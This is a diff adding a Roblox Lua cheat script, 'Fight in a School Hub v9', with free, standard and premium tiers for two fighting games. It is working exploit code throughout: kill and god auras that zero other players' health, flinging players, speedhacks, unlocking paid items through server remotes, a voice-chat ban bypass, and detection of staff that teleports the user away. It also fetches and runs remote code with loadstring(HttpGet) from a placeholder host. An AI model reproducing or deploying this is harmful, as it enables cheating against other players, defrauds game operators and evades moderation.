@@ -1,0 +1,298 @@
+-- Configuration
+getgenv().Game = "FIAS"  -- Set to "UBG" for Untitled Boxing Game
+getgenv().Tier = "FREE"  -- Options: "FREE", "STANDARD", "PREMIUM"
+getgenv().HWIDResetCount = 0
+local RS = game:GetService("ReplicatedStorage")
+local P = game:GetService("Players")
+local LP = P.LocalPlayer
+local RunService = game:GetService("RunService")
+local CH = LP.Character or LP.CharacterAdded:Wait()
+local HM = CH:WaitForChild("Humanoid")
+local RP = CH:WaitForChild("HumanoidRootPart")
+local Camera = workspace.CurrentCamera
+local J = math.random
+
+loadstring(game:HttpGet("https://your-secure-host.com/scripts/fight_school_hub_v9.lua"))()
+
+local function HWIDReset()
+    if getgenv().Tier == "PREMIUM" and getgenv().HWIDResetCount < 1 then
+        getgenv().HWIDResetCount = 1
+        LP:ClearAllChildren() 
+        print("HWID Reset used (1/1 today) - Premium perk!")
+    end
+end
+
+spawn(function()
+    if getgenv().Tier == "PREMIUM" then
+        while wait(5) do
+            for _, pl in pairs(P:GetPlayers()) do
+                if pl.Name:lower():find("staff") or pl.DisplayName:find("Mod") then
+                    game:GetService("TeleportService"):Teleport(game.PlaceId, LP)
+                    break
+                end
+            end
+        end
+    end
+end)
+
+-- Premium Support Placeholder
+if getgenv().Tier == "PREMIUM" then print("Premium Support: DM @xAI_ExploitDev | 5% off accounts in #1395892717405605919") end
+
+-- Unlock All Styles & Inventory (FIAS Only)
+if getgenv().Game == "FIAS" then
+    local function UnlockAllStyles()
+        local Styles = {"Amateur", "Boxer", "Weave", "Striker", "Muay Thai", "SAVAGE", "Karate", "Kicker", "Hitman", "Ali", "Khabib", "Hawk", "Bo Staff", "Foreman", "Crash Out", "Crowbar", "Breaker", "Philly", "Stud", "Peanut Butter", "Spinner", "Slap Boxer", "Tanto", "Baddie", "Cane"}
+        local StyleEvent = RS:FindFirstChild("UnlockStyle") or RS:FindFirstChild("EquipStyle")
+        for _, style in pairs(Styles) do
+            if StyleEvent then StyleEvent:FireServer(style, true) end
+        end
+        print("All styles unlocked!")
+    end
+
+    local function UnlockAllInventory()
+        local Inventory = {
+            Shanks = {"Kunai", "Shank", "Candy Cane", "Butterfly", "Stiletto", "Dagger"},
+            Gloves = {"Boxing Gloves", "Fingerless", "Weighted"},
+            Knuckles = {"Brass", "Steel", "Spiked"},
+            Bats = {"Wooden", "Aluminum", "Metal"},
+            Sneakers = {"Runners", "Boots", "Slides"},
+            Finishers = {"Jeet Kune Do", "Blade", "Ninja"},
+            Takedowns = {"Savage", "Karate", "Kicker"},
+            HeavyAttacks = {"SAVAGE", "Karate", "Kicker"},
+            Auras = {"Fire Aura", "Ice Aura", "Lightning Aura"}
+        }
+        local ItemEvent = RS:FindFirstChild("UnlockItem") or RS:FindFirstChild("InventoryUpdate")
+        for Category, ItemList in pairs(Inventory) do
+            for _, item in pairs(ItemList) do
+                if ItemEvent then ItemEvent:FireServer(Category, item, true) end
+            end
+        end
+        print("All inventory unlocked!")
+    end
+
+    local function ModifyUI()
+        local PlayerGui = LP:WaitForChild("PlayerGui")
+        local InventoryGui = PlayerGui:FindFirstChild("Inventory") or PlayerGui:FindFirstChild("MainUI"):WaitForChild("InventoryFrame")
+        if InventoryGui then
+            for _, btn in pairs(InventoryGui:GetDescendants()) do
+                if btn:IsA("TextButton") and (btn.Text:find("Buy") or btn.Text:find("Purchase")) then
+                    btn.Text = "Equip"
+                    btn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+                end
+            end
+        end
+    end
+
+    spawn(function() UnlockAllStyles() end)
+    spawn(function() UnlockAllInventory() end)
+    spawn(function() while wait(5) do ModifyUI() end end)
+    spawn(function() while wait(J(10, 20)) do  -- Auto-Equip
+        local AllItems = {"Kunai", "SAVAGE", "Muay Thai", "Fire Aura"}
+        local Item = AllItems[J(1, #AllItems)]
+        local EquipEvent = RS:FindFirstChild("EquipItem") or RS:FindFirstChild("StyleChange")
+        if EquipEvent then EquipEvent:FireServer(Item) end
+        HM.WalkSpeed = J(16, 60)
+    end end)
+end
+
+-- FIAS: Nearest Target Helper
+local function getNearestTarget()
+    local N, D = nil, math.huge
+    for _, PL in pairs(P:GetPlayers()) do
+        if PL ~= LP and PL.Character then
+            local TR = PL.Character:FindFirstChild("HumanoidRootPart")
+            if TR then
+                local DST = (RP.Position - TR.Position).Magnitude
+                if DST < D then D, N = DST, PL end
+            end
+        end
+    end
+    return N
+end
+
+-- FIAS FREE: Basic Kill Aura
+local function BasicKillAura()
+    local Range = 20
+    for _, PL in pairs(P:GetPlayers()) do
+        if PL ~= LP and PL.Character then
+            local TR = PL.Character:FindFirstChild("HumanoidRootPart")
+            if TR and (RP.Position - TR.Position).Magnitude < Range then
+                local TH = PL.Character:FindFirstChild("Humanoid")
+                if TH and TH.Health > 0 then
+                    local CM = RS:FindFirstChild("Combat") or RS:FindFirstChild("Damage")
+                    if CM then CM:FireServer(TH, J(20, 40)) end
+                end
+            end
+        end
+    end
+end
+spawn(function() while wait(J(0.2, 0.6)) do BasicKillAura() end end)
+
+-- FIAS FREE: Speedhack
+HM.WalkSpeed = J(16, 50)
+
+-- FIAS FREE: Misc Features (Anti-AFK, TP)
+spawn(function() while wait(60) do HM.Jump = true; wait(0.1); HM.Jump = false end end)
+local TPEvent = RS:FindFirstChild("Teleport")
+if TPEvent then TPEvent:FireServer("Rooftop") end
+
+-- FIAS STANDARD
+if getgenv().Tier == "STANDARD" or getgenv().Tier == "PREMIUM" then
+    -- Kill Aura With All Attack Methods (Attack, Heavy, Slam, Shove)
+    local function MultiAura()
+        local attacks = {"Attack", "Heavy", "Slam", "Shove"}
+        local method = attacks[J(1, #attacks)]
+        local AM = RS:FindFirstChild(method)
+        local target = getNearestTarget()
+        if AM and target then AM:FireServer(target) end
+    end
+    spawn(function() while wait(J(0.3, 0.7)) do MultiAura() end end)
+
+    -- Slam Aura, Shove Aura (Integrated in MultiAura)
+
+    -- Fling All
+    local function FlingAll()
+        for _, PL in pairs(P:GetPlayers()) do
+            if PL ~= LP and PL.Character then
+                local TR = PL.Character.HumanoidRootPart
+                TR.Velocity = Vector3.new(J(-100,100), 200, J(-100,100))
+            end
+        end
+    end
+    spawn(function() while wait(10) do FlingAll() end end)
+
+    -- Heavy Style Changer
+    local HeavyStyles = {"SAVAGE", "Karate", "Kicker"}
+    local HSC = RS:FindFirstChild("HeavyStyleChange")
+    spawn(function() while wait(15) do if HSC then HSC:FireServer(HeavyStyles[J(1, #HeavyStyles)]) end end end)
+
+    -- God Aura (Insta Kills)
+    local function GodAura()
+        for _, PL in pairs(P:GetPlayers()) do
+            if PL ~= LP and PL.Character then PL.Character.Humanoid.Health = 0 end
+        end
+    end
+    spawn(function() while wait(J(1, 3)) do GodAura() end end)
+
+    -- Force Join Peoples Parties
+    local FJ = RS:FindFirstChild("ForceJoinParty")
+    spawn(function() while wait(20) do if FJ then for _, PL in pairs(P:GetPlayers()) do FJ:FireServer(PL) end end end end)
+
+    -- Player Throw
+    local function ThrowPlayer(target)
+        if target and target.Character then
+            local BV = Instance.new("BodyVelocity")
+            BV.MaxForce = Vector3.new(4000, 4000, 4000)
+            BV.Velocity = RP.CFrame.LookVector * 100
+            BV.Parent = target.Character.HumanoidRootPart
+            game:GetService("Debris"):AddItem(BV, 2)
+        end
+    end
+    spawn(function() while wait(5) do ThrowPlayer(getNearestTarget()) end end)
+
+    -- Autoweave
+    local AW = RS:FindFirstChild("Autoweave")
+    if AW then AW:FireServer(true) end
+
+    -- Bypass VC Bans
+    local VCB = RS:FindFirstChild("VCBypass")
+    if VCB then VCB:FireServer(true) end
+end
+
+-- FIAS PREMIUM (Everything +)
+if getgenv().Tier == "PREMIUM" and getgenv().Game == "FIAS" then
+    -- Style Changer (Full)
+    local Styles = {"Hitman", "Ali", "Khabib", "Muay Thai", "SAVAGE"}
+    local SC = RS:FindFirstChild("StyleChange")
+    spawn(function() while wait(J(20, 40)) do if SC then SC:FireServer(Styles[J(1, #Styles)]) end end end)
+
+    -- Autofarm Kills
+    spawn(function() while wait(J(0.1, 0.4)) do BasicKillAura() end end)
+
+    -- Autofarm Respect
+    local function FarmRespect()
+        for _, PL in pairs(P:GetPlayers()) do
+            if PL ~= LP then
+                local RE = RS:FindFirstChild("Respect") or RS:FindFirstChild("GiveRespect")
+                if RE then RE:FireServer(PL, J(10, 50)) end
+            end
+        end
+    end
+    spawn(function() while wait(J(1, 3)) do FarmRespect() end end)
+end
+
+-- Untitled Boxing Game Features
+if getgenv().Game == "UBG" then
+    -- General
+    -- Speedhack
+    HM.WalkSpeed = J(16, 100)
+
+    -- FOV Changer
+    Camera.FieldOfView = J(70, 120)
+
+    -- Unlock All Emotes
+    local EmoteEvent = RS:FindFirstChild("UnlockEmote")
+    local Emotes = {"Taunt", "Dance", "Punch", "Block"}
+    for _, em in pairs(Emotes) do if EmoteEvent then EmoteEvent:FireServer(em, true) end end
+
+    -- Skin Changer / Knockdown Changer
+    local SkinEvent = RS:FindFirstChild("ChangeSkin")
+    local KnockEvent = RS:FindFirstChild("KnockdownStyle")
+    local Skins = {"Classic", "Golden", "Neon"}
+    spawn(function() while wait(J(30, 60)) do
+        if SkinEvent then SkinEvent:FireServer(Skins[J(1, #Skins)]) end
+        if KnockEvent then KnockEvent:FireServer("Instant") end
+    end end)
+
+    -- Combat
+    -- No Stun
+    HM:SetAttribute("StunImmune", true)
+
+    -- No Reversed Inputs
+    local InputEvent = RS:FindFirstChild("InputReverse")
+    if InputEvent then InputEvent:FireServer(false) end
+
+    -- No Knockback
+    local KnockbackEvent = RS:FindFirstChild("Knockback")
+    if KnockbackEvent then KnockbackEvent:FireServer(0) end
+
+    -- No Heavy Delay
+    local HeavyDelay = RS:FindFirstChild("HeavyCooldown")
+    if HeavyDelay then HeavyDelay:FireServer(0) end
+
+    -- No Attack Delay (Super Fast Punch)
+    spawn(function() while wait(0.01) do
+        local Punch = RS:FindFirstChild("Punch")
+        if Punch then Punch:FireServer() end
+    end end)
+
+    -- No Feint Delay
+    local Feint = RS:FindFirstChild("FeintDelay")
+    if Feint then Feint:FireServer(0) end
+
+    -- Complete Dash Control
+    local DashEvent = RS:FindFirstChild("Dash")
+    if DashEvent then DashEvent:FireServer({Speed = 100, Distance = 50, Delay = 0}) end
+
+    -- No Block Delay
+    local BlockDelay = RS:FindFirstChild("BlockCooldown")
+    if BlockDelay then BlockDelay:FireServer(0) end
+
+    -- Block While Dashing
+    local BlockDash = RS:FindFirstChild("BlockDash")
+    if BlockDash then BlockDash:FireServer(true) end
+end
+
+-- Anti-Desync (Both Games)
+spawn(function()
+    while wait(1) do
+        if HM.Health <= 0 then
+            LP.CharacterAdded:Wait()
+            CH = LP.Character
+            HM = CH:WaitForChild("Humanoid")
+            RP = CH:WaitForChild("HumanoidRootPart")
+        end
+    end
+end)
+
+print("Fight in a School Hub v9 loaded! Game: " .. getgenv().Game .. " | Tier: " .. getgenv().Tier .. " | All unlocked + exploits active. Use HWIDReset() for daily reset.")
